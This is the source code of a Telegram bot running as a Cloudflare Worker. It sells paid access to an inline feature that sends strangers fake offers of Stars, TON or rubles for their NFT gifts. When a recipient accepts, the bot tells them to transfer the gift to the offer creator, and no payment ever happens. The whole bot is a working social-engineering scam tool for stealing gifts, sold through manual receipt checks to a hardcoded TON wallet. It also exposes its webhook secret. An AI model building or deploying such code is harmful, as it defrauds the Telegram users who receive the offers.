const ADMIN_ID = 5151757168; 
const WEBHOOK_SECRET = "GarisOffer9231998"; 
const TON_WALLET = "UQChRfzub4CLp2FAV998bfowFC4eE3aqIRQQeZinoajQ0oOG"; 
const SUPPORT_LINK = "https://t.me/gwrex";

// Базовые цены (без скидки)
const BASE_STARS_PRICE = 250;
const BASE_TON_PRICE = 3;

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 
    const kv = env.USERS_KV; 

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // ==========================================
      // ПРОВЕРКА ДОСТУПА
      // ==========================================
      async function checkAccess(userId, username) {
          if (userId === ADMIN_ID) return true; 
          if (!kv) return false; 
          const byId = await kv.get(`allowed_id:${userId}`);
          if (byId) return true;
          if (username) {
              const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
              if (byName) return true;
          }
          return false;
      }

      // ==========================================
      // КОМАНДЫ АДМИНА (СОЗДАНИЕ И УДАЛЕНИЕ ПРОМОКОДОВ)
      // ==========================================
      if (update.message && update.message.text.startsWith("/NEWPROMO")) {
        if (update.message.from.id !== ADMIN_ID) return new Response("OK", { status: 200 });
        const args = update.message.text.split(" ");
        
        if (args.length < 3) {
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⚠️ Формат: <code>/NEWPROMO [скидка_stars] [скидка_ton]</code>", parse_mode: "HTML" }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        const discountStars = parseInt(args[1]);
        const discountTon = parseFloat(args[2]);
        
        // Генерируем случайный код
        const promoCode = Math.random().toString(36).substring(2, 10).toUpperCase();
        
        if (kv) {
            await kv.put(`promo:${promoCode}`, JSON.stringify({ discountStars, discountTon }));
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Промокод создан!\n\nКод: <code>${promoCode}</code>\nСкидка: ${discountStars} Stars или ${discountTon} TON`, parse_mode: "HTML" }, BOT_TOKEN);
        }
        return new Response("OK", { status: 200 });
      }

      if (update.message && update.message.text.startsWith("/DELETEPROMO")) {
        if (update.message.from.id !== ADMIN_ID) return new Response("OK", { status: 200 });
        const args = update.message.text.split(" ");
        
        if (args.length < 2) {
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⚠️ Формат: <code>/DELETEPROMO [код]</code>", parse_mode: "HTML" }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        const promoCode = args[1].toUpperCase();
        if (kv) {
            await kv.delete(`promo:${promoCode}`);
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Промокод <code>${promoCode}</code> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
        }
        return new Response("OK", { status: 200 });
      }

      // ==========================================
      // КОМАНДА /buy (МЕНЮ ОПЛАТЫ)
      // ==========================================
      if (update.message && update.message.text === "/buy") {
        const chatId = update.message.chat.id;
        const buyText = `💳 <b>Выберите способ оплаты:</b>\n\n1. <b>${BASE_STARS_PRICE} ⭐ Stars</b> (перевод на аккаунт)\n2. <b>${BASE_TON_PRICE} 💎 TON</b> (перевод на кошелек)\n\n🎁 Есть промокод? Введите его командой:\n<code>/promo ВАШ_КОД</code>\n\n<i>После выбора способа вы получите реквизиты для оплаты.</i>`;
        const buyMarkup = {
            inline_keyboard: [
                [{ text: `⭐ Оплатить ${BASE_STARS_PRICE} Stars`, callback_data: "pay_stars" }],
                [{ text: `💎 Оплатить ${BASE_TON_PRICE} TON`, callback_data: "pay_ton" }]
            ]
        };
        await callApi("sendMessage", { chat_id: chatId, text: buyText, parse_mode: "HTML", reply_markup: buyMarkup }, BOT_TOKEN);
      }

      // ==========================================
      // ВВОД ПРОМОКОДА
      // ==========================================
      if (update.message && update.message.text.startsWith("/promo ")) {
        const chatId = update.message.chat.id;
        const promoCode = update.message.text.replace("/promo ", "").toUpperCase().trim();
        
        if (!kv) return new Response("OK", { status: 200 });

        const promoData = await kv.get(`promo:${promoCode}`);
        if (promoData) {
            const promo = JSON.parse(promoData);
            const newStars = BASE_STARS_PRICE - promo.discountStars;
            const newTon = (BASE_TON_PRICE - promo.discountTon).toFixed(2);

            const text = `✅ <b>Промокод применен!</b>\n\nВаша цена:\n⭐ <b>${newStars} Stars</b>\n💎 <b>${newTon} TON</b>\n\nВыберите способ оплаты:`;
            const markup = {
                inline_keyboard: [
                    [{ text: `⭐ Оплатить ${newStars} Stars`, callback_data: `pay_promo_stars_${newStars}` }],
                    [{ text: `💎 Оплатить ${newTon} TON`, callback_data: `pay_promo_ton_${newTon}` }]
                ]
            };
            await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML", reply_markup: markup }, BOT_TOKEN);
        } else {
            await callApi("sendMessage", { chat_id: chatId, text: `❌ Промокод не найден или недействителен.`, parse_mode: "HTML" }, BOT_TOKEN);
        }
        return new Response("OK", { status: 200 });
      }

      // ==========================================
      // ОБРАБОТКА СКРИНШОТОВ ЧЕКОВ
      // ==========================================
      if (update.message && update.message.photo) {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username || "no_username";
        const photoId = update.message.photo[update.message.photo.length - 1].file_id;

        const adminText = `📸 <b>Новый чек об оплате!</b>\n\n👤 От: @${username} (ID: <code>${userId}</code>)`;
        const adminMarkup = {
            inline_keyboard: [
                [{ text: "✅ Принять", callback_data: `approve_${userId}` }, { text: "❌ Отклонить", callback_data: `reject_${userId}` }]
            ]
        };

        try {
            await callApi("sendPhoto", { chat_id: ADMIN_ID, photo: photoId, caption: adminText, parse_mode: "HTML", reply_markup: adminMarkup }, BOT_TOKEN);
            await callApi("sendMessage", { chat_id: chatId, text: `📥 <b>Чек получен!</b>\n\nОжидайте проверки.`, parse_mode: "HTML" }, BOT_TOKEN);
        } catch (e) {
            await callApi("sendMessage", { chat_id: chatId, text: `❌ Ошибка отправки чека.`, parse_mode: "HTML" }, BOT_TOKEN);
        }
        return new Response("OK", { status: 200 });
      }

      // ==========================================
      // ОСТАЛЬНЫЕ КОМАНДЫ АДМИНА
      // ==========================================
      if (update.message && (update.message.text.startsWith("/add ") || update.message.text.startsWith("/remove "))) {
        const senderId = update.message.from.id;
        if (senderId !== ADMIN_ID) return new Response("OK", { status: 200 });
        if (!kv) return new Response("OK", { status: 200 });

        const args = update.message.text.split(" ");
        const command = args[0]; 
        const targetUser = args[1]; 
        if (!targetUser) return new Response("OK", { status: 200 });

        if (command === "/remove" && targetUser.toLowerCase() === "all") {
            try {
                let cursor = undefined;
                let keysToDelete = [];
                for (let i = 0; i < 3; i++) {
                    cursor = undefined;
                    do {
                        const list = await kv.list({ cursor });
                        for (const key of list.keys) {
                            if (key.name.startsWith("allowed_")) {
                                if (key.name === `allowed_id:${ADMIN_ID}`) continue;
                                keysToDelete.push(key.name);
                            }
                        }
                        cursor = list.cursor;
                    } while (cursor);
                }
                keysToDelete = [...new Set(keysToDelete)];
                for (const key of keysToDelete) await kv.delete(key);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 <b>Список доступа очищен!</b>`, parse_mode: "HTML" }, BOT_TOKEN);
            } catch (err) {}
            return new Response("OK", { status: 200 });
        }

        if (command === "/add") {
            if (targetUser.startsWith("@")) {
                const uname = targetUser.slice(1).toLowerCase();
                const userId = await kv.get(`username_id:${uname}`);
                if (!userId) {
                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `⚠️ Пользователь не найден (пусть нажмет /start).`, parse_mode: "HTML" }, BOT_TOKEN);
                } else {
                    await kv.put(`allowed_username:${uname}`, "true");
                    await kv.put(`allowed_id:${userId}`, "true");
                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь <b>@${uname}</b> добавлен.`, parse_mode: "HTML" }, BOT_TOKEN);
                }
            } else {
                await kv.put(`allowed_id:${targetUser}`, "true");
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ ID <code>${targetUser}</code> добавлен.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        } else if (command === "/remove") {
            if (targetUser.startsWith("@")) {
                await kv.delete(`allowed_username:${targetUser.slice(1).toLowerCase()}`);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь удален.`, parse_mode: "HTML" }, BOT_TOKEN);
            } else {
                await kv.delete(`allowed_id:${targetUser}`);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь удален.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        }
        return new Response("OK", { status: 200 });
      }

      if (update.message && update.message.text.startsWith("/text ")) {
        const senderId = update.message.from.id;
        if (senderId !== ADMIN_ID) return new Response("OK", { status: 200 });
        const broadcastText = update.message.text.replace("/text ", "");
        if (!broadcastText) return new Response("OK", { status: 200 });

        let cursor = undefined;
        let users = [];
        do {
            const list = await kv.list({ cursor, prefix: "user:" });
            for (const key of list.keys) { users.push(key.name.replace("user:", "")); }
            cursor = list.cursor;
        } while (cursor);

        for (const userId of users) {
            try {
                await callApi("sendMessage", { chat_id: userId, text: broadcastText, parse_mode: "HTML" }, BOT_TOKEN);
                await new Promise(r => setTimeout(r, 50)); 
            } catch (e) {}
        }
        await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Рассылка завершена.`, parse_mode: "HTML" }, BOT_TOKEN);
        return new Response("OK", { status: 200 });
      }

      if (update.message && update.message.text === "/stats") {
        const senderId = update.message.from.id;
        const chatId = update.message.chat.id;
        if (senderId !== ADMIN_ID) return new Response("OK", { status: 200 });
        if (!kv) return new Response("OK", { status: 200 });

        let cursor = undefined;
        let accessList = [];
        let totalUsers = 0;
        let totalOffers = 0;

        do {
            const list = await kv.list({ cursor });
            for (const key of list.keys) {
                if (key.name.startsWith("user:")) totalUsers++;
                if (key.name.startsWith("offer:")) totalOffers++;
                if (key.name.startsWith("allowed_id:")) {
                    const userId = key.name.replace("allowed_id:", "");
                    const username = await kv.get(`user:${userId}`) || "нет_в_базе";
                    accessList.push(`@${username} (${userId})`);
                }
            }
            cursor = list.cursor;
        } while (cursor);

        let statsText = `📊 <b>Статистика:</b>\n\n👥 Всего: ${totalUsers}\n👤 С доступом: ${accessList.length}\n📦 Офферов: ${totalOffers}\n\n`;
        if (accessList.length > 0) statsText += `📋 <b>Доступ:</b>\n${accessList.join("\n")}`;
        await callApi("sendMessage", { chat_id: chatId, text: statsText, parse_mode: "HTML" }, BOT_TOKEN);
        return new Response("OK", { status: 200 });
      }

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username || "no_username";
        if (kv) {
            await kv.put(`user:${userId}`, username);
            if (username !== "no_username") await kv.put(`username_id:${username.toLowerCase()}`, userId.toString());
        }

        const hasAccess = await checkAccess(userId, username);

        let startText = "";
        let startMarkup = {};

        if (hasAccess) {
            startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n✅ <b>У вас есть доступ к созданию офферов!</b>\n\n📖 <b>Как создать оффер (пошагово):</b>\n\n1. Зайдите в профиль человека, у которого есть нужный вам подарок.\n2. Найдите этот подарок и скопируйте на него ссылку (она выглядит как <code>t.me/nft/...</code>).\n3. Выйдите в любой чат (например, в «Избранное») и напишите команду:\n\n<code>@GarisOfferRobot [ссылка] [цена] [валюта]</code>\n\n<b>Пример:</b>\n<code>@GarisOfferRobot t.me/nft/PrettyPosy-5375 500 stars</code>\n\n4. Нажмите на окошко, которое выскочит над строкой ввода, и отправьте оффер.\n\n👨‍💻 <b>Поддержка:</b> <a href="${SUPPORT_LINK}">клик</a>`;
            await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", disable_web_page_preview: true }, BOT_TOKEN);
        } else {
            startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n🔒 <b>У вас нет доступа.</b>\n\nВы можете купить доступ, нажав на кнопку ниже.\n\n👨‍💻 <b>Поддержка:</b> <a href="${SUPPORT_LINK}">клик</a>`;
            startMarkup = { inline_keyboard: [[{ text: "💳 Купить доступ", callback_data: "buy_access" }]] };
            await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup, disable_web_page_preview: true }, BOT_TOKEN);
        }
      }

      // --- INLINE-ЗАПРОСЫ ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username || "";

        const hasAccess = await checkAccess(userId, username);
        if (!hasAccess) return new Response("OK", { status: 200 });

        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
        
        let lang = "ru";
        if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); }
        else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }

        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
        let giftLink = "";
        if (giftMatch) {
            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
            giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
        }

        let currencyType = "stars";
        let currencyDisplay = "⭐ Stars";
        if (textQuery.includes("gram") || textQuery.includes("ton")) { currencyType = "gram"; currencyDisplay = "💎 Gram"; } 
        else if (textQuery.includes("rub") || textQuery.includes("руб")) { currencyType = "rub"; currencyDisplay = "₽ Rub"; }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
        
        const targetReceiver = iq.from.username || "gwrex";

        let text = "";
        let btnAccept = "Принять";
        let btnDecline = "Отклонить";
        let titleText = "";

        if (lang === "en") {
            text = `<b>Gift Offer</b>\n\nYou are offered <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
            btnAccept = "Accept"; btnDecline = "Decline"; titleText = `Offer: ${amount} ${currencyDisplay}`;
        } else if (lang === "cn") {
            text = `<b>礼物报价</b>\n\n有人为您提供 <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
            btnAccept = "接受"; btnDecline = "拒绝"; titleText = `报价: ${amount} ${currencyDisplay}`;
        } else {
            text = `<b>Оффер на подарок</b>\n\nВам предлагают <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
            btnAccept = "Принять"; btnDecline = "Отклонить"; titleText = `Оффер: ${amount} ${currencyDisplay}`;
        }

        const offerId = Math.random().toString(36).substring(2, 10);
        if (kv) await kv.put(`offer:${offerId}`, JSON.stringify({ amount, currencyType, giftLink, lang, senderName, targetReceiver }), { expirationTtl: 86400 });

        const results = [{
          type: "article", id: "1", title: titleText, description: `${amount} ${currencyDisplay}`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${offerId}` }],[{ text: btnDecline, callback_data: `dec|${offerId}` }]] }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        
        if (cq.data === "buy_access") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            const chatId = cq.message.chat.id;
            const buyText = `💳 <b>Выберите способ оплаты:</b>\n\n1. <b>${BASE_STARS_PRICE} ⭐ Stars</b> (перевод на аккаунт)\n2. <b>${BASE_TON_PRICE} 💎 TON</b> (перевод на кошелек)\n\n🎁 Есть промокод? Введите его командой:\n<code>/promo ВАШ_КОД</code>\n\n<i>После выбора способа вы получите реквизиты для оплаты.</i>`;
            const buyMarkup = {
                inline_keyboard: [
                    [{ text: `⭐ Оплатить ${BASE_STARS_PRICE} Stars`, callback_data: "pay_stars" }],
                    [{ text: `💎 Оплатить ${BASE_TON_PRICE} TON`, callback_data: "pay_ton" }]
                ]
            };
            await callApi("sendMessage", { chat_id: chatId, text: buyText, parse_mode: "HTML", reply_markup: buyMarkup }, BOT_TOKEN);
        }

        if (cq.data === "pay_stars") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            const chatId = cq.message.chat.id;
            const text = `⭐ <b>Оплата ${BASE_STARS_PRICE} Stars</b>\n\nПереведите ${BASE_STARS_PRICE} звезд на аккаунт: <a href="${SUPPORT_LINK}">клик</a>\n\nПосле перевода отправьте скриншот чека сюда.`;
            await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML", disable_web_page_preview: true }, BOT_TOKEN);
        }

        if (cq.data === "pay_ton") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            const chatId = cq.message.chat.id;
            const text = `💎 <b>Оплата ${BASE_TON_PRICE} TON</b>\n\nПереведите ${BASE_TON_PRICE} TON на кошелек:\n<code>${TON_WALLET}</code>\n\nПосле перевода отправьте скриншот чека сюда.`;
            await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" }, BOT_TOKEN);
        }

        // Обработка оплаты со скидкой
        if (cq.data.startsWith("pay_promo_stars_")) {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            const chatId = cq.message.chat.id;
            const price = cq.data.split("_")[3];
            const text = `⭐ <b>Оплата ${price} Stars (со скидкой)</b>\n\nПереведите ${price} звезд на аккаунт: <a href="${SUPPORT_LINK}">клик</a>\n\nПосле перевода отправьте скриншот чека сюда.`;
            await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML", disable_web_page_preview: true }, BOT_TOKEN);
        }

        if (cq.data.startsWith("pay_promo_ton_")) {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            const chatId = cq.message.chat.id;
            const price = cq.data.split("_")[3];
            const text = `💎 <b>Оплата ${price} TON (со скидкой)</b>\n\nПереведите ${price} TON на кошелек:\n<code>${TON_WALLET}</code>\n\nПосле перевода отправьте скриншот чека сюда.`;
            await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" }, BOT_TOKEN);
        }

        if (cq.data.startsWith("approve_") || cq.data.startsWith("reject_")) {
            if (cq.from.id !== ADMIN_ID) {
                await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "⛔ Вы не админ.", show_alert: true }, BOT_TOKEN);
                return new Response("OK", { status: 200 });
            }

            const action = cq.data.split("_")[0];
            const targetUserId = cq.data.split("_")[1];

            if (action === "approve") {
                if (kv) await kv.put(`allowed_id:${targetUserId}`, "true");
                await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Доступ выдан ✅" }, BOT_TOKEN);
                await callApi("sendMessage", { chat_id: targetUserId, text: `✅ <b>Оплата подтверждена!</b>\n\nВам выдан доступ. Теперь вы можете создавать офферы.`, parse_mode: "HTML" }, BOT_TOKEN);
                await callApi("editMessageCaption", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, caption: cq.message.caption + "\n\n✅ <b>Одобрено</b>", parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }, BOT_TOKEN);
            } else {
                await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Отклонено ❌" }, BOT_TOKEN);
                await callApi("sendMessage", { chat_id: targetUserId, text: `❌ <b>Оплата отклонена.</b>\n\nЕсли вы уверены, что оплатили, свяжитесь с админом.`, parse_mode: "HTML" }, BOT_TOKEN);
                await callApi("editMessageCaption", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, caption: cq.message.caption + "\n\n❌ <b>Отклонено</b>", parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }, BOT_TOKEN);
            }
        }

        if (cq.data === "back_to_start") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
          const userId = cq.from.id;
          const username = cq.from.username || "no_username";
          const hasAccess = await checkAccess(userId, username);

          let startText = "";
          let startMarkup = {};

          if (hasAccess) {
              startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n✅ <b>У вас есть доступ к созданию офферов!</b>\n\n📖 <b>Как создать оффер (пошагово):</b>\n\n1. Зайдите в профиль человека, у которого есть нужный вам подарок.\n2. Найдите этот подарок и скопируйте на него ссылку (она выглядит как <code>t.me/nft/...</code>).\n3. Выйдите в любой чат (например, в «Избранное») и напишите команду:\n\n<code>@GarisOfferRobot [ссылка] [цена] [валюта]</code>\n\n<b>Пример:</b>\n<code>@GarisOfferRobot t.me/nft/PrettyPosy-5375 500 stars</code>\n\n4. Нажмите на окошко, которое выскочит над строкой ввода, и отправьте оффер.\n\n👨‍💻 <b>Поддержка:</b> <a href="${SUPPORT_LINK}">клик</a>`;
              await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", disable_web_page_preview: true }, BOT_TOKEN);
          } else {
              startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n🔒 <b>У вас нет доступа.</b>\n\nВы можете купить доступ, нажав на кнопку ниже.\n\n👨‍💻 <b>Поддержка:</b> <a href="${SUPPORT_LINK}">клик</a>`;
              startMarkup = { inline_keyboard: [[{ text: "💳 Купить доступ", callback_data: "buy_access" }]] };
              await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup, disable_web_page_preview: true }, BOT_TOKEN);
          }
        }

        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          const dataParts = cq.data.split("|");
          const action = dataParts[0];
          const offerId = dataParts[1];
          
          if (!offerId) return new Response("OK", { status: 200 });

          let offer = { amount: "0", currencyType: "stars", giftLink: "", lang: "ru", senderName: "", targetReceiver: "gwrex" };
          if (kv) {
              const saved = await kv.get(`offer:${offerId}`);
              if (saved) offer = JSON.parse(saved);
          }

          const amount = offer.amount;
          const currencyType = offer.currencyType;
          const lang = offer.lang;
          const targetReceiver = offer.targetReceiver || "gwrex";
          
          let displayCurrency = "⭐ Stars";
          if (currencyType === "gram") displayCurrency = "💎 Gram";
          if (currencyType === "rub") displayCurrency = "₽ Rub";

          const buyer = cq.from;
          let buyerName = buyer.first_name || "";
          if (buyer.last_name) buyerName += " " + buyer.last_name;

          let newText = "";
          let newMarkup = { inline_keyboard: [] };

          if (action === "acc") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: `Оффер принят ✅`, show_alert: true }, BOT_TOKEN);
            
            const finalUrl = "https://t.me/" + targetReceiver;

            if (lang === "en") {
                newText = `✅ <b>Accepted</b>\n\nTo receive <b>${amount} ${displayCurrency}</b>, send the gift to the seller.`;
                newMarkup = { inline_keyboard: [[{ text: "Send Gift", url: finalUrl }]] };
            } else if (lang === "cn") {
                newText = `✅ <b>已接受</b>\n\n要获得 <b>${amount} ${displayCurrency}</b>，请将礼物发送给卖家。`;
                newMarkup = { inline_keyboard: [[{ text: "发送礼物", url: finalUrl }]] };
            } else {
                newText = `✅ <b>Принято</b>\n\nЧтобы получить <b>${amount} ${displayCurrency}</b>, передайте подарок продавцу.`;
                newMarkup = { inline_keyboard: [[{ text: "Передать подарок", url: finalUrl }]] };
            }
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            newText = lang === "en" ? `❌ <b>Declined</b>` : `❌ <b>Отклонено</b>`;
          }

          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup, disable_web_page_preview: true }, BOT_TOKEN);
              } else {
                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup, disable_web_page_preview: true }, BOT_TOKEN);
              }
            } catch (err) {}
          } else if (cq.message) {
            const chatId = cq.message.chat.id;
            const messageId = cq.message.message_id;
            try {
                await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup, disable_web_page_preview: true }, BOT_TOKEN);
              try { await callApi("deleteMessage", { chat_id: chatId, message_id: messageId }, BOT_TOKEN); } catch (e) {}
            } catch (err) {}
          }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}